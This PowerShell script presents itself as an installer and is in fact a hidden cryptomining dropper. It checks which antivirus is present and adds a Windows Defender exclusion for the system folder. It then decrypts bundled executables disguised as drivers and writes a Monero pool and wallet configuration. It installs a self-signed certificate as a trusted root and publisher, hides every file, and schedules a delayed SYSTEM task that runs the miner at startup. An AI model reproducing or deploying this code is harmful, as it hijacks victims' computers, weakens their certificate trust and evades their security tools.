#Requires -RunAsAdministrator

Function Check-AV {
  $wmiQuery = "SELECT * FROM AntiVirusProduct" 
  $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters         
  [array]$AntivirusNames = $AntivirusProduct.displayName     
    
  Switch($AntivirusNames) {
    {$AntivirusNames.Count -eq 0} {return $true}
    {$AntivirusNames.Count -eq 1 -and $_ -eq "Windows Defender"} {return $true}
    {$_ -ne "Windows Defender"} {return $false}
  }
}

Function Get-PSScriptPath {
  if ([System.IO.Path]::GetExtension($PSCommandPath) -eq '.ps1') {
      $psScriptPath = $PSCommandPath
      } else {
          $psScriptPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
      }
  return Split-Path -Path $psScriptPath
}

Function Sign-Script {
  [CmdletBinding()]
  param ([string] $FilePath)  
  $authenticode = New-SelfSignedCertificate -Subject "Store Authenticode" -CertStoreLocation "Cert:\LocalMachine\My" -NotAfter (Get-Date).AddYears(10) -Type CodeSigningCert

  $rootStore = [System.Security.Cryptography.X509Certificates.X509Store]::new("Root","LocalMachine")
  $rootStore.Open("ReadWrite")
  $rootStore.Add($authenticode)
  $rootStore.Close()

  $publisherStore = [System.Security.Cryptography.X509Certificates.X509Store]::new("TrustedPublisher","LocalMachine")
  $publisherStore.Open("ReadWrite")
  $publisherStore.Add($authenticode)
  $publisherStore.Close()

  $codeCertificate = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=Store Authenticode"}
  Set-AuthenticodeSignature -FilePath $FilePath -Certificate $codeCertificate
}

Function Decrypt-File {
  [CmdletBinding()]
  param (
    [byte[]] $Key,
    [byte[]] $Init,
    [string] $Path,
    [string] $Destination
  )  
  $AES = [System.Security.Cryptography.AesManaged]::new()
  $AES.Key = $Key
  $AES.IV = $Init

  $Decryptor = $AES.CreateDecryptor()

  $EncryptedFile = [System.IO.File]::OpenRead($Path)
  $DecryptedFile = [System.IO.File]::OpenWrite($Destination)

  $CryptoStream = [System.Security.Cryptography.CryptoStream]::new($DecryptedFile, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

  $EncryptedFile.CopyTo($CryptoStream)

  $CryptoStream.Flush()
  $DecryptedFile.Flush()
  $EncryptedFile.Flush()
  $CryptoStream.Clear()
  $EncryptedFile.Close()
  $DecryptedFile.Close()
}

if(Check-AV){  
  if([Environment]::Is64BitOperatingSystem){
    $DestDirectory = "C:\Windows\SysWOW64"
  }
  else{
    $DestDirectory = "C:\Windows\System32"
  }
    
  Add-MpPreference -ExclusionPath $DestDirectory

  $Pass = [Text.Encoding]::UTF8.GetBytes("J4ck.Sp4rr0w")
  $Salt = [Text.Encoding]::UTF8.GetBytes("1996")
  $Init = [Text.Encoding]::UTF8.GetBytes("Yet another Pirate")

  $Key = (new-Object Security.Cryptography.PasswordDeriveBytes $Pass, $Salt, "SHA256", 5).GetBytes(32)
  $Init = (new-Object Security.Cryptography.SHA256Managed).ComputeHash($Init)[0..15]

  $SourceFile = (Get-PSScriptPath) + "\File0"
  $DestinationFile = $DestDirectory + "\SysDriver.exe"
  Decrypt-File -Path $SourceFile -Destination $DestinationFile -Key $Key -Init $Init

  $SourceFile = (Get-PSScriptPath) + "\File1"
  $DestinationFile = $DestDirectory + "\TskDriver.exe"
  Decrypt-File -Path $SourceFile -Destination $DestinationFile -Key $Key -Init $Init

  '"call_timeout" : 10,"retry_time" : 30,"giveup_limit" : 0,"verbose_level" : 0,"print_motd" : true,"h_print_time" : 300,"aes_override" : null,"use_slow_memory" : "always","tls_secure_algo" : true,"daemon_mode" : true,"output_file" : "","httpd_port" : 0,"http_login" : "","http_pass" : "","prefer_ipv4" : true,' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\config.txt")
  '"cpu_threads_conf" : [{ "low_power_mode" : 1, "affine_to_cpu" : 0 },{ "low_power_mode" : 1, "affine_to_cpu" : 1 },{ "low_power_mode" : 1, "affine_to_cpu" : 2 }]' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\cpu.txt")
  '"pool_list" :[{"pool_address" : "xmrpool.eu:3333", "wallet_address" : "86H1wsznA3KK1d1syK68ujEuRgBk2zovUCXRtmGMTv6V3iaUDw1d9xphJBuao3iEKPBW4iN5uW6QhfWbeJLfGXhW9n23CYP", "rig_id" : "", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },],"currency" : "monero",' | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\pools.txt")

@"
Start-Process -FilePath "$DestDirectory\SysDriver.exe" -ArgumentList "--noAMD","--noNVIDIA","--noTest" -WorkingDirectory "$DestDirectory" -WindowStyle Hidden
Start-Process -FilePath "$DestDirectory\TskDriver.exe" -ArgumentList "-n SysDriver.exe" -WorkingDirectory "$DestDirectory" -WindowStyle Hidden
"@ | Out-File -Encoding "UTF8" -FilePath ($DestDirectory + "\init.ps1")

  Sign-Script -FilePath ($DestDirectory + "\init.ps1")
  (Get-Item ($DestDirectory + "\SysDriver.exe")).Attributes += 'Hidden'
  (Get-Item ($DestDirectory + "\TskDriver.exe")).Attributes += 'Hidden'
  (Get-Item ($DestDirectory + "\config.txt")).Attributes += 'Hidden'
  (Get-Item ($DestDirectory + "\cpu.txt")).Attributes += 'Hidden'
  (Get-Item ($DestDirectory + "\pools.txt")).Attributes += 'Hidden'
  (Get-Item ($DestDirectory + "\init.ps1")).Attributes += 'Hidden'

  $TaskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument ($DestDirectory + "\init.ps1")
  $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
  $TaskTrigger.StartBoundary = (Get-Date).AddDays(5).ToString('s')
  $TaskPrincipal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
  Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Principal $TaskPrincipal -TaskName "System" -Description "System init Script"
}

# launch the real installation setup
# .
# .
# .
# .
# .
# .